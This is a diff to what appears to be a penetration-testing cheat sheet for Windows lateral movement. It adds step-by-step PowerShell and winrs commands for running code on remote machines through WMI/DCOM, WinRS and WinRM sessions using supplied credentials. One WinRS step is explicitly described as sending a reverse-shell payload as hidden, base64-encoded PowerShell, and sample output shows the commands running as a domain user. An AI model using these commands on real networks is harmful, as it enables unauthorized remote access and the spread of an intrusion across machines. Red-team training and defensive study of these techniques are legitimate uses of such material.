@@ -1,6 +1,7 @@
 #ON WINDOWS MACHINE.
-
-WMI Lateral Movement (DCOM) — PowerShell
+#################################
+################################## WMI Lateral Movement (DCOM) — PowerShell
+###################################
 
 # Step 1 — Set credentials
 $username = '';
@@ -19,3 +20,44 @@ $Command = 'powershell -nop -w hidden -e <base64_encoded_payload>';
 
 # Step 5 — Invoke it via WMI
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command};
+
+##########################
+#############################    WinRS Lateral Movement
+##########################
+ 
+# Step 1 — Test command execution on remote machine
+winrs -r:SERVER -u:user -p:<PASSWORD>! "cmd /c hostname & whoami"
+
+# Output confirms execution as:
+#SERVER
+# corp\user
+
+# Step 2 — Send reverse shell payload via WinRS
+winrs -r:SERVER -u:user -p:PASSWORD "powershell -nop -w hidden -e <base64_encoded_payload>"
+
+######################################################
+#################################
+##################################  PSSession Lateral Movement (WinRM)
+
+
+# Step 1 — Set credentials
+$username = 'user';
+$password = 'password!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+# Step 2 — Create remote session
+New-PSSession -ComputerName <IP>-Credential $credential
+
+# Output confirms session opened:
+# Id  Name    ComputerName    State   ConfigurationName
+# 1   WinRM1  192.168..0.1  Opened  Microsoft.PowerShell
+
+# Step 3 — Enter the session interactively
+Enter-PSSession 1
+
+# Now you're on the remote machine!
+# [192.168.xx]: PS C:\Users\jen\Documents> whoami
+# corp\user
+# [192.168.xx]: PS C:\Users\jen\Documents> hostname
+# SERVER
